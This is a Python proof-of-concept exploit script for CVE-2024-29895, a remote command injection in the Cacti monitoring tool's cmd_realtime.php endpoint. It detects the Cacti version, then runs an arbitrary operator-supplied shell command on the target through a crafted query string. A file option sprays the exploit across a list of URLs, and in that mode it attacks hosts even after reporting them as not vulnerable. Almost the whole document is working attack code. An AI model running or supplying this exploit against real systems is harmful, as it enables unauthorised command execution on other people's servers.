import requests
import argparse
import urllib3
from urllib.parse import urlparse
import re
import pdb


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
RED = "\033[0;31m"
GREEN = "\033[0;32m"
CYAN = "\033[0;36m"
YELLOW = "\033[1;33m"
END = "\033[0m"

def check_url(url):
    endpoint = "/cacti/cmd_realtime.php"
    url = url + endpoint
    try:
        response = requests.get(url, verify=False)
    except:
        return "NEXT" 

    if response.status_code == 200:
        print(f"{GREEN}[*]{END} Found a Cacti instance")
        return True
    else:
        print(f"{RED}[!] Not Cacti instance found{END}")
        return False
    
def check_version(url):
    try:
        response = requests.get(url, verify=False)
        patterns = [
            r"Cacti (\d+\.\d+\.\d+)",
            r"var cactiVersion='(\d+\.\d+\.\d+)'",
            r"Version (\d+\.\d+\.\d+)"
        ]
        for pattern in patterns:
            version = re.search(pattern, response.text)
            if version:
                return version.group(1)
    except requests.exceptions.RequestException as e:
        print(f"{RED}[!] Request failed: {e}{END}")

def RCE(url, command):

    fullUrl = urlparse(url)
    stripUrl = f"{fullUrl.scheme}://{fullUrl.netloc}"

    url = stripUrl
    payload = url + "/cacti/cmd_realtime.php?1+1&&" + command + "+1+1+1"

    print (f"{GREEN}[*]{END} REQUEST: {CYAN}{payload}{END}")
    response = requests.get(payload, verify=False)
    print(f"\n{GREEN}[*]{END} Response:")
    readable = response.text.replace("<br>", "\n")
    print(readable)


def main():
    parser = argparse.ArgumentParser(description="CVE-2024-29895 - RCE PoC")
    parser.add_argument('-u', '--url', dest="url",help="Target Url")
    parser.add_argument('-c', '--command', dest="command", required=True, help="Command for the RCE")
    parser.add_argument('-f', '--file', dest="file", help="File with all URL to try", type=str)

    args = parser.parse_args()
    command = args.command
    pathfile = args.file

    if pathfile is None:
        url = args.url
        version = check_version(url)
        if version:
            print(f"{GREEN}[*]{END} Found Cacti version: {version}")
            if not version.startswith('1.3.'):
                print(f"{RED}[!] The version {version} is not vulnerable to CVE-2024-29895{END}")
                exit()
        else:
            print(f"{RED}[!] Could not find the version, are you sure you are running a CACTI instance?{END}")
            exit()
        if check_url(url):
            RCE(url, command)
    else:
        file(pathfile, command)


def file(pathfile, command):

    with open(pathfile, "r") as file:
            
            url = file.read()
            url = url.split()

            for nurl in range(len(url)):
                murl = url[nurl]

                version = check_version(murl)

                if version:
                    print(f"{GREEN}[*]{END} Found Cacti version: {version}")
                    if check_url(murl):
                        RCE(murl, command)
                    if not version.startswith('1.3.'):
                        print(f"{RED}[!] The version {version} is not vulnerable to CVE-2024-29895{END}")
                else:
                    print(f"{RED}[!] Could not find the version, are you sure you are running a CACTI instance?{END}")

if __name__ == "__main__":
    main()
